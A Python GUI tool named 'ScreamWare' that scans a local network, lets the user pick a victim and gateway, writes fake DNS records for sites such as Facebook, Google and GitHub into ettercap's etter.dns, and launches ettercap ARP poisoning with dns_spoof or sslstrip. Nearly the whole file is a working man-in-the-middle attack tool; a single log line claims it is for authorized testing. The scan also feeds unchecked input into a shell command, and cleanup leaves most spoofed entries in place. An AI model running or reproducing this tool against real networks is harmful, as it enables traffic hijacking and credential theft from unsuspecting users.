import subprocess
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext, filedialog
import atexit
import re
import threading
import json
import os
from datetime import datetime
import ipaddress

ETTER_DNS_PATH = "/usr/share/ettercap/etter.dns"
spoof_ip_global = ""
ettercap_process = None
scan_results = []
domain_list = [
    "facebook.com", "X.com", "youtube.com",
    "google.com", "instagram.com", "chatgpt.com",
    "twitter.com", "linkedin.com", "reddit.com",
    "github.com", "stackoverflow.com"
]

# Configuration file
CONFIG_FILE = "screamware_config.json"

# IP address validation
def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        parts = ip.split('.')
        return all(0 <= int(part) <= 255 for part in parts)
    return False

# Network discovery functions
def get_network_interfaces():
    """Get available network interfaces"""
    try:
        result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
        interfaces = []
        for line in result.stdout.split('\n'):
            if ': ' in line and not line.startswith(' '):
                iface = line.split(':')[1].strip().split('@')[0]
                if iface != 'lo':
                    interfaces.append(iface)
        return interfaces
    except:
        return ["wlan0", "eth0", "lo"]

def get_interface_ip(interface):
    """Get IP address for a specific interface"""
    try:
        result = subprocess.run(['ip', 'addr', 'show', interface], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line and 'scope global' in line:
                return line.split()[1].split('/')[0]
    except:
        pass
    return ""

def scan_network(network_range):
    """Scan network for active hosts"""
    global scan_results
    scan_results = []

    try:
        net = ipaddress.IPv4Network(network_range, strict=False)
        log_output(f"🔍 Scanning network: {network_range}", "info")

        # Use nmap if available, otherwise ping
        try:
            cmd = f"nmap -sn {network_range} | grep 'Nmap scan report for'"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            for line in result.stdout.split('\n'):
                if 'Nmap scan report for' in line:
                    ip = line.split('(')[1].split(')')[0] if '(' in line else line.split()[-1]
                    hostname = line.split('Nmap scan report for ')[1].split(' (')[0] if '(' in line else line.split('Nmap scan report for ')[1]
                    scan_results.append({"ip": ip, "hostname": hostname})

        except:
            # Fallback to ping scan
            log_output("🔄 Using ping scan (nmap not available)", "warning")
            for ip in net.hosts():
                if str(ip).endswith('.0') or str(ip).endswith('.255'):
                    continue
                cmd = f"ping -c 1 -W 1 {ip} > /dev/null 2>&1"
                if subprocess.run(cmd, shell=True).returncode == 0:
                    scan_results.append({"ip": str(ip), "hostname": "Unknown"})

        log_output(f"✅ Found {len(scan_results)} active hosts", "success")
        update_scan_results_tree()

    except Exception as e:
        log_output(f"❌ Network scan failed: {e}", "error")

# Configuration management
def save_config():
    """Save current configuration to file"""
    config = {
        "target_ip": target_entry.get(),
        "gateway_ip": gateway_entry.get(),
        "spoof_ip": spoof_ip_entry.get(),
        "interface": iface_var.get(),
        "plugin": plugin_var.get(),
        "domains": domain_list
    }

    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        log_output("💾 Configuration saved", "success")
    except Exception as e:
        log_output(f"❌ Failed to save config: {e}", "error")

def load_config():
    """Load configuration from file"""
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)

            target_entry.delete(0, tk.END)
            target_entry.insert(0, config.get("target_ip", ""))

            gateway_entry.delete(0, tk.END)
            gateway_entry.insert(0, config.get("gateway_ip", ""))

            spoof_ip_entry.delete(0, tk.END)
            spoof_ip_entry.insert(0, config.get("spoof_ip", ""))

            iface_var.set(config.get("interface", "wlan0"))
            plugin_var.set(config.get("plugin", "dns_spoof"))

            global domain_list
            domain_list = config.get("domains", domain_list)

            log_output("📂 Configuration loaded", "success")
    except Exception as e:
        log_output(f"❌ Failed to load config: {e}", "error")

# Domain management
def add_domain():
    """Add a new domain to the spoof list"""
    domain = domain_entry.get().strip().lower()
    if domain and domain not in domain_list:
        domain_list.append(domain)
        domain_entry.delete(0, tk.END)
        update_domain_list()
        log_output(f"➕ Added domain: {domain}", "success")

def remove_domain():
    """Remove selected domain from the spoof list"""
    selection = domain_listbox.curselection()
    if selection:
        domain = domain_listbox.get(selection[0])
        domain_list.remove(domain)
        update_domain_list()
        log_output(f"➖ Removed domain: {domain}", "info")

def update_domain_list():
    """Update the domain listbox"""
    domain_listbox.delete(0, tk.END)
    for domain in sorted(domain_list):
        domain_listbox.insert(tk.END, domain)

def update_scan_results_tree():
    """Update the scan results tree view"""
    for item in scan_results_tree.get_children():
        scan_results_tree.delete(item)

    for host in scan_results:
        scan_results_tree.insert("", "end", values=(host["ip"], host["hostname"]))

# Export functionality
def export_logs():
    """Export logs to a file"""
    try:
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile=f"screamware_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )

        if filename:
            with open(filename, 'w') as f:
                f.write(output_text.get(1.0, tk.END))
            log_output(f"📄 Logs exported to {filename}", "success")
    except Exception as e:
        log_output(f"❌ Failed to export logs: {e}", "error")

# Ghost domains
def build_spoof_list(ip):
    return [{ "domain": d, "ip": ip } for d in domain_list]

# Log output with timestamp
def log_output(message, tag=""):
    timestamp = datetime.now().strftime("%H:%M:%S")
    formatted_message = f"[{timestamp}] {message}\n"
    output_text.insert(tk.END, formatted_message, tag)
    output_text.see(tk.END)
    root.update_idletasks()

# Inject spoof entries
def inject_spoof_entries(ip):
    global spoof_ip_global
    spoof_ip_global = ip
    spoof_list = build_spoof_list(ip)
    try:
        with open(ETTER_DNS_PATH, "a") as f:
            for entry in spoof_list:
                f.write(f"{entry['domain']} A {entry['ip']}\n")
        log_output("✅ Spoof entries injected successfully", "success")
        return True
    except PermissionError:
        messagebox.showerror("Permission Denied", "Run this script with sudo to modify etter.dns.")
        log_output("❌ Permission denied - need sudo privileges", "error")
        return False
    except Exception as e:
        messagebox.showerror("Error", str(e))
        log_output(f"❌ Error injecting spoof entries: {e}", "error")
        return False

# Cleanup on exit
def cleanup_etter_dns():
    if not spoof_ip_global:
        return
    try:
        with open(ETTER_DNS_PATH, "r") as f:
            lines = f.readlines()
        with open(ETTER_DNS_PATH, "w") as f:
            for line in lines:
                if not any(spoof_ip_global in line and domain in line for domain in [
                    "facebook.com", "X.com", "youtube.com", "google.com", "instagram.com", "chatgpt.com"
                ]):
                    f.write(line)
        print("💀 Spoof entries removed from etter.dns.")
    except Exception as e:
        print("❌ Cleanup error:", e)

atexit.register(cleanup_etter_dns)

# Stop Ettercap process
def stop_ettercap():
    global ettercap_process
    if ettercap_process:
        try:
            ettercap_process.terminate()
            log_output("⏹️ Ettercap process terminated", "warning")
            ettercap_process = None
            launch_button.config(text="Launch Ettercap", state="normal")
        except Exception as e:
            log_output(f"❌ Error stopping Ettercap: {e}", "error")

# Launch Ettercap in separate thread
def run_ettercap():
    global ettercap_process

    # Validate inputs
    target_ip = target_entry.get().strip()
    gateway_ip = gateway_entry.get().strip()
    redirect_ip = spoof_ip_entry.get().strip()
    interface = iface_var.get()
    plugin = plugin_var.get()

    if not all([target_ip, gateway_ip, redirect_ip]):
        messagebox.showerror("Missing Info", "Please fill in all required fields.")
        return

    if not all([validate_ip(target_ip), validate_ip(gateway_ip), validate_ip(redirect_ip)]):
        messagebox.showerror("Invalid IP", "Please enter valid IP addresses.")
        return

    if not inject_spoof_entries(redirect_ip):
        return

    command = f"sudo ettercap -T -q -i {interface} -M arp:remote /{target_ip}// /{gateway_ip}// -P {plugin}"
    log_output(f"📡 Executing: {command}", "info")

    # Run in separate thread to avoid freezing GUI
    def run_command():
        global ettercap_process
        try:
            ettercap_process = subprocess.Popen(command, shell=True,
                                              stdout=subprocess.PIPE,
                                              stderr=subprocess.STDOUT,
                                              universal_newlines=True)

            # Read output in real-time
            for line in iter(ettercap_process.stdout.readline, ''):
                if line.strip():
                    log_output(line.strip(), "output")

            ettercap_process.stdout.close()
            return_code = ettercap_process.wait()

            if return_code == 0:
                log_output("✅ Ettercap completed successfully", "success")
            else:
                log_output(f"⚠️ Ettercap exited with code: {return_code}", "warning")

        except Exception as e:
            log_output(f"❌ Error running Ettercap: {e}", "error")
        finally:
            ettercap_process = None
            root.after(0, lambda: launch_button.config(text="Launch Ettercap", state="normal"))

    # Start thread
    launch_button.config(text="Running...", state="disabled")
    threading.Thread(target=run_command, daemon=True).start()

# Clear output
def clear_output():
    output_text.delete(1.0, tk.END)
    log_output("Output cleared", "info")

# Glitch-style title reveal
def glitch_reveal(widget, text, delay=50):
    widget.config(text="")
    def reveal(i=0):
        if i < len(text):
            widget.config(text=widget.cget("text") + text[i])
            widget.after(delay, reveal, i+1)
    reveal()

# GUI setup
root = tk.Tk()
root.title("ScreamWare: DNS Spoofing Framework")
root.geometry("900x700")
root.configure(bg="#1e1e1e")
root.resizable(True, True)

# Configure styles
style = ttk.Style()
style.theme_use('clam')

# Configure ttk styles for dark theme
style.configure('TNotebook', background='#1e1e1e', borderwidth=0)
style.configure('TNotebook.Tab', background='#333', foreground='white', padding=[12, 8])
style.map('TNotebook.Tab', background=[('selected', '#444')])
style.configure('TTreeview', background='#333', foreground='white', fieldbackground='#333')
style.configure('TTreeview.Heading', background='#444', foreground='white')

# Title frame
title_frame = tk.Frame(root, bg="#1e1e1e")
title_frame.pack(pady=10)

title_label = tk.Label(title_frame, fg="#ff0040", bg="#1e1e1e", font=("Courier", 16, "bold"))
title_label.pack()
glitch_reveal(title_label, "ScreamWare: DNS Spoofing Framework")

# Create notebook for tabs
notebook = ttk.Notebook(root)
notebook.pack(padx=10, pady=5, fill=tk.BOTH, expand=True)

# Main tab
main_tab = tk.Frame(notebook, bg="#1e1e1e")
notebook.add(main_tab, text="Main")

# Network Discovery tab
discovery_tab = tk.Frame(notebook, bg="#1e1e1e")
notebook.add(discovery_tab, text="Network Discovery")

# Domain Management tab
domain_tab = tk.Frame(notebook, bg="#1e1e1e")
notebook.add(domain_tab, text="Domain Management")

# Main container for main tab
main_frame = tk.Frame(main_tab, bg="#1e1e1e")
main_frame.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)

# Input fields frame
input_frame = tk.Frame(main_frame, bg="#1e1e1e")
input_frame.pack(fill=tk.X, pady=10)

# Create input fields with labels
def create_input_field(parent, label_text, default_value="", width=30):
    frame = tk.Frame(parent, bg="#1e1e1e")
    frame.pack(fill=tk.X, pady=5)

    label = tk.Label(frame, text=label_text, fg="white", bg="#1e1e1e",
                    font=("Arial", 10), width=20, anchor="w")
    label.pack(side=tk.LEFT, padx=(0, 10))

    entry = tk.Entry(frame, width=width, bg="#333", fg="white",
                    insertbackground="white", font=("Arial", 10))
    entry.pack(side=tk.LEFT, fill=tk.X, expand=True)

    if default_value:
        entry.insert(0, default_value)

    return entry

# Target IP
target_entry = create_input_field(input_frame, "Target IP *:")

# Gateway IP
gateway_entry = create_input_field(input_frame, "Gateway IP *:")

# Spoof IP
spoof_ip_entry = create_input_field(input_frame, "Spoof Redirect IP *:")

# Interface and plugins row
options_frame = tk.Frame(main_frame, bg="#1e1e1e")
options_frame.pack(fill=tk.X, pady=10)

# Interface selection
iface_frame = tk.Frame(options_frame, bg="#1e1e1e")
iface_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))

tk.Label(iface_frame, text="Interface:", fg="white", bg="#1e1e1e",
         font=("Arial", 10), width=12, anchor="w").pack(anchor="w")

iface_var = tk.StringVar(value="wlan0")
available_interfaces = get_network_interfaces()
iface_dropdown = ttk.Combobox(iface_frame, textvariable=iface_var,
                            values=available_interfaces, state="readonly", width=15)
iface_dropdown.pack(fill=tk.X)

# Auto-detect IP button
auto_ip_button = tk.Button(iface_frame, text="Auto-Detect IP",
                          command=lambda: spoof_ip_entry.delete(0, tk.END) or spoof_ip_entry.insert(0, get_interface_ip(iface_var.get())),
                          bg="#333", fg="white", font=("Arial", 9))
auto_ip_button.pack(pady=(5, 0))

# Plugin selection
plugin_frame = tk.Frame(options_frame, bg="#1e1e1e")
plugin_frame.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(10, 0))

tk.Label(plugin_frame, text="Plugin:", fg="white", bg="#1e1e1e",
         font=("Arial", 10), width=12, anchor="w").pack(anchor="w")

plugin_var = tk.StringVar(value="dns_spoof")
plugin_dropdown = ttk.Combobox(plugin_frame, textvariable=plugin_var,
                              values=["dns_spoof", "remote_browser", "sslstrip"],
                              state="readonly", width=15)
plugin_dropdown.pack(fill=tk.X)

# Control buttons
button_frame = tk.Frame(main_frame, bg="#1e1e1e")
button_frame.pack(fill=tk.X, pady=10)

launch_button = tk.Button(button_frame, text="Launch Ettercap", command=run_ettercap,
                         bg="#0a7e3d", fg="white", font=("Arial", 10, "bold"),
                         padx=20, pady=5, relief=tk.RAISED, bd=2)
launch_button.pack(side=tk.LEFT, padx=5)

stop_button = tk.Button(button_frame, text="Stop", command=stop_ettercap,
                       bg="#d32f2f", fg="white", font=("Arial", 10, "bold"),
                       padx=20, pady=5, relief=tk.RAISED, bd=2)
stop_button.pack(side=tk.LEFT, padx=5)

clear_button = tk.Button(button_frame, text="Clear Output", command=clear_output,
                        bg="#666", fg="white", font=("Arial", 10),
                        padx=20, pady=5, relief=tk.RAISED, bd=2)
clear_button.pack(side=tk.LEFT, padx=5)

save_config_button = tk.Button(button_frame, text="Save Config", command=save_config,
                              bg="#444", fg="white", font=("Arial", 10),
                              padx=20, pady=5, relief=tk.RAISED, bd=2)
save_config_button.pack(side=tk.LEFT, padx=5)

load_config_button = tk.Button(button_frame, text="Load Config", command=load_config,
                              bg="#444", fg="white", font=("Arial", 10),
                              padx=20, pady=5, relief=tk.RAISED, bd=2)
load_config_button.pack(side=tk.LEFT, padx=5)

export_button = tk.Button(button_frame, text="Export Logs", command=export_logs,
                         bg="#444", fg="white", font=("Arial", 10),
                         padx=20, pady=5, relief=tk.RAISED, bd=2)
export_button.pack(side=tk.LEFT, padx=5)

# Output area with scrollbar
output_frame = tk.Frame(main_frame, bg="#1e1e1e")
output_frame.pack(fill=tk.BOTH, expand=True, pady=10)

tk.Label(output_frame, text="Output Log:", fg="white", bg="#1e1e1e",
         font=("Arial", 10, "bold")).pack(anchor="w")

output_text = scrolledtext.ScrolledText(output_frame, height=15, bg="#0d1117",
                                      fg="#c9d1d9", font=("Courier", 9),
                                      wrap=tk.WORD, relief=tk.SUNKEN, bd=2)
output_text.pack(fill=tk.BOTH, expand=True)

# Configure text tags for colored output
output_text.tag_configure("success", foreground="#4ade80")
output_text.tag_configure("error", foreground="#f87171")
output_text.tag_configure("warning", foreground="#fbbf24")
output_text.tag_configure("info", foreground="#60a5fa")
output_text.tag_configure("output", foreground="#e5e7eb")

# Status bar
status_frame = tk.Frame(root, bg="#0d1117", height=25)
status_frame.pack(fill=tk.X, side=tk.BOTTOM)
status_frame.pack_propagate(False)

status_label = tk.Label(status_frame, text="Ready", fg="#4ade80", bg="#0d1117",
                       font=("Arial", 9), anchor="w")
status_label.pack(side=tk.LEFT, padx=10, pady=2)

# Network Discovery Tab
discovery_frame = tk.Frame(discovery_tab, bg="#1e1e1e")
discovery_frame.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)

# Network scan input
scan_input_frame = tk.Frame(discovery_frame, bg="#1e1e1e")
scan_input_frame.pack(fill=tk.X, pady=10)

tk.Label(scan_input_frame, text="Network Range:", fg="white", bg="#1e1e1e",
         font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))

network_entry = tk.Entry(scan_input_frame, width=30, bg="#333", fg="white",
                        insertbackground="white", font=("Arial", 10))
network_entry.pack(side=tk.LEFT, padx=(0, 10))
network_entry.insert(0, "192.168.1.0/24")

scan_button = tk.Button(scan_input_frame, text="Scan Network",
                       command=lambda: threading.Thread(target=lambda: scan_network(network_entry.get()), daemon=True).start(),
                       bg="#0a7e3d", fg="white", font=("Arial", 10, "bold"),
                       padx=20, pady=5)
scan_button.pack(side=tk.LEFT)

# Results frame
results_frame = tk.Frame(discovery_frame, bg="#1e1e1e")
results_frame.pack(fill=tk.BOTH, expand=True, pady=10)

tk.Label(results_frame, text="Discovered Hosts:", fg="white", bg="#1e1e1e",
         font=("Arial", 10, "bold")).pack(anchor="w")

# Create treeview for scan results
tree_frame = tk.Frame(results_frame, bg="#1e1e1e")
tree_frame.pack(fill=tk.BOTH, expand=True)

scan_results_tree = ttk.Treeview(tree_frame, columns=("IP", "Hostname"), show="headings", height=12)
scan_results_tree.heading("IP", text="IP Address")
scan_results_tree.heading("Hostname", text="Hostname")
scan_results_tree.column("IP", width=150)
scan_results_tree.column("Hostname", width=200)

scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=scan_results_tree.yview)
scan_results_tree.configure(yscrollcommand=scrollbar.set)

scan_results_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

# Double-click to select target and gateway
def on_host_double_click(event):
    selection = scan_results_tree.selection()
    if selection:
        item = scan_results_tree.item(selection[0])
        ip = item['values'][0]

        # Simple logic: first click sets target, second sets gateway
        if not target_entry.get():
            target_entry.delete(0, tk.END)
            target_entry.insert(0, ip)
            log_output(f"🎯 Selected target: {ip}", "info")
        elif not gateway_entry.get() and ip != target_entry.get():
            gateway_entry.delete(0, tk.END)
            gateway_entry.insert(0, ip)
            log_output(f"🌐 Selected gateway: {ip}", "info")
        else:
            target_entry.delete(0, tk.END)
            target_entry.insert(0, ip)
            log_output(f"🎯 New target: {ip}", "info")

scan_results_tree.bind("<Double-1>", on_host_double_click)

# Domain Management Tab
domain_mgmt_frame = tk.Frame(domain_tab, bg="#1e1e1e")
domain_mgmt_frame.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)

# Add domain section
add_domain_frame = tk.Frame(domain_mgmt_frame, bg="#1e1e1e")
add_domain_frame.pack(fill=tk.X, pady=10)

tk.Label(add_domain_frame, text="Add Domain:", fg="white", bg="#1e1e1e",
         font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))

domain_entry = tk.Entry(add_domain_frame, width=30, bg="#333", fg="white",
                       insertbackground="white", font=("Arial", 10))
domain_entry.pack(side=tk.LEFT, padx=(0, 10))

add_domain_button = tk.Button(add_domain_frame, text="Add Domain", command=add_domain,
                             bg="#0a7e3d", fg="white", font=("Arial", 10),
                             padx=20, pady=5)
add_domain_button.pack(side=tk.LEFT)

# Domain list
domain_list_frame = tk.Frame(domain_mgmt_frame, bg="#1e1e1e")
domain_list_frame.pack(fill=tk.BOTH, expand=True, pady=10)

tk.Label(domain_list_frame, text="Spoof Domains:", fg="white", bg="#1e1e1e",
         font=("Arial", 10, "bold")).pack(anchor="w")

list_frame = tk.Frame(domain_list_frame, bg="#1e1e1e")
list_frame.pack(fill=tk.BOTH, expand=True)

# Domain listbox with scrollbar
domain_scrollbar = tk.Scrollbar(list_frame)
domain_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

domain_listbox = tk.Listbox(list_frame, bg="#333", fg="white",
                           yscrollcommand=domain_scrollbar.set,
                           font=("Arial", 10), height=15)
domain_listbox.pack(fill=tk.BOTH, expand=True)
domain_scrollbar.config(command=domain_listbox.yview)

# Remove domain button
remove_domain_button = tk.Button(domain_list_frame, text="Remove Selected Domain",
                               command=remove_domain, bg="#d32f2f", fg="white",
                               font=("Arial", 10), padx=20, pady=5)
remove_domain_button.pack(pady=(10, 0))

# Initialize domain list
update_domain_list()

# Auto-detect interface IP on startup
current_ip = get_interface_ip(iface_var.get())
if current_ip:
    spoof_ip_entry.insert(0, current_ip)
    log_output(f"🔧 Auto-detected interface IP: {current_ip}", "info")

# Try to load existing config
load_config()

# Initial log
log_output("🚀 ScreamWare DNS Spoofing Framework Initialized", "success")
log_output("⚠️  Warning: This tool is for authorized security testing only", "warning")
log_output("💡 Double-click hosts in Network Discovery to auto-fill targets", "info")
log_output("🔥 ScreamWare - When networks scream for mercy", "info")

root.mainloop()
